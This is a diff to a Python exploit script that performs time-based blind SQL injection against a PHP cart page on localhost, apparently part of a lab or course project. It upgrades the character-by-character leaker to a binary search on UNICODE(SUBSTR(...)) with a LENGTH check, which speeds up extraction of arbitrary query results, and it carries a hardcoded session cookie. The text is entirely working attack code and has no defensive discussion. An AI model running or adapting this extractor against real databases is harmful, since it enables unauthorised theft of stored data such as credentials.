@@ -3,7 +3,9 @@ import time
 
 URL = "http://localhost/CyberProject/cart.php"
 COOKIES = {'PHPSESSID': '82reb4vqs953kqhnm8ull3r0am'}
-ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#"
+# Binary search bounds over printable ASCII (space..~)
+CHAR_LO = 32
+CHAR_HI = 126
 
 def get_baseline():
     print("[+] Measuring server baseline response time...")
@@ -33,20 +35,27 @@ def check_condition_time(payload, baseline):
         return False
 
 def leak_string(source_query, baseline, label):
-    """Generic char-by-char leaker: source_query must be a SELECT that returns ONE string."""
+    """Generic char-by-char leaker using binary search on UNICODE() of each position."""
     discovered = ""
     pos = 1
     while True:
-        found_char = False
-        for char in ALPHABET:
-            payload = f"UPPER(SUBSTR(({source_query}), {pos}, 1)) = '{char}'"
-            if check_condition_time(payload, baseline):
-                discovered += char
-                print(f"  [{label}] pos {pos}: {char} -> {discovered}")
-                found_char = True
-                break
-        if not found_char:
+        # Is there still a character at this position?
+        if not check_condition_time(f"LENGTH(({source_query})) >= {pos}", baseline):
             break
+
+        # Binary search the ASCII code of the char at `pos`.
+        lo, hi = CHAR_LO, CHAR_HI
+        while lo < hi:
+            mid = (lo + hi) // 2
+            payload = f"UNICODE(SUBSTR(({source_query}), {pos}, 1)) > {mid}"
+            if check_condition_time(payload, baseline):
+                lo = mid + 1
+            else:
+                hi = mid
+
+        char = chr(lo)
+        discovered += char
+        print(f"  [{label}] pos {pos}: {char} -> {discovered}")
         pos += 1
     return discovered
 
